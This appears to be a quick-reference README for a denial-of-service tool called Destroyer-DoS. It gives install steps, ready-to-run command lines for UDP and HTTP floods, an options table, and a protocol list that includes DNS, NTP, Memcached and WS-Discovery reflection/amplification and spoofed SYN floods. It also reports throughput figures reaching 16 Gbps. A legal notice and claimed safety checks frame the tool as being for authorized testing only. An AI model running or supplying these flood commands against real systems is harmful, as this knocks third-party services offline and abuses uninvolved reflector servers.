# Quick Reference

Essential commands and information for Destroyer-DoS.

---

## Installation

```bash
git clone https://github.com/Destroyer-official/Destroyer-DoS.git
cd Destroyer-DoS
pip install -r requirements.txt
```

---

## Basic Commands

```bash
# Show help
python ddos.py --help

# Basic attack
python ddos.py -i TARGET -p PORT -t PROTOCOL

# UDP flood
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60

# HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -x 8

# High performance
python ddos.py -i 192.168.1.100 -p 80 -t UDP -s 8192 -x 32
```

---

## Command Options

| Option           | Description         | Default  |
| ---------------- | ------------------- | -------- |
| `-i, --target`   | Target IP/hostname  | Required |
| `-p, --port`     | Target port         | Required |
| `-t, --protocol` | Attack protocol     | Required |
| `-d, --duration` | Duration (seconds)  | 60       |
| `-x, --threads`  | Thread count        | 4        |
| `-s, --size`     | Packet size (bytes) | 1024     |
| `-v, --verbose`  | Verbose output      | Off      |

---

## Protocols

| Protocol     | Type          | Use Case              |
| ------------ | ------------- | --------------------- |
| TCP          | Flood         | General testing       |
| UDP          | Flood         | Bandwidth testing     |
| HTTP         | Layer 7       | Web servers           |
| HTTPS        | Layer 7       | Secure web            |
| DNS          | Amplification | DNS servers           |
| ICMP         | Echo          | Network testing       |
| SLOW         | Slowloris     | Connection exhaustion |
| QUANTUM      | Multi-vector  | Advanced testing      |
| TCP-SYN      | SYN flood     | Firewall testing      |
| TCP-ACK      | ACK flood     | Stateful firewalls    |
| PUSH-ACK     | Segment flood | Applications          |
| WS-DISCOVERY | Reflection    | Amplification         |
| MEMCACHED    | Reflection    | Amplification         |
| SYN-SPOOF    | Spoofed SYN   | Advanced              |
| NTP          | Reflection    | Amplification         |

---

## Performance Results

Verified on test hardware:

| Protocol     | Throughput | PPS     |
| ------------ | ---------- | ------- |
| UDP-8192-32T | 16.03 Gbps | 244,630 |
| UDP-4096-32T | 8.40 Gbps  | 256,450 |
| UDP-1472-64T | 2.60 Gbps  | 220,650 |
| QUANTUM-4096 | 1.95 Gbps  | 59,440  |
| WS-DISCOVERY | 291 Mbps   | 260,510 |
| DNS          | 68 Mbps    | 268,470 |

---

## Key Directories

```
ddos.py             Main attack engine
core/               Framework modules
  safety/           Safety systems
  networking/       Network operations
  ai/               AI optimization
  analytics/        Performance analytics
config/             Configuration files
docs/               Documentation
tests/              Test suite
```

---

## Safety Features

- Target validation (blocks production systems)
- Resource monitoring (prevents overload)
- Emergency stop (Ctrl+C)
- Audit logging

---

## Troubleshooting

| Problem                  | Solution                              |
| ------------------------ | ------------------------------------- |
| Permission denied        | Run with sudo/admin                   |
| Target validation failed | Use authorized target                 |
| Low performance          | Increase threads/packet size          |
| Module not found         | Run `pip install -r requirements.txt` |

---

## Legal Notice

For authorized security testing only:

- Your own systems
- Systems with written permission
- Isolated test environments

---

**Version**: 1.0.0
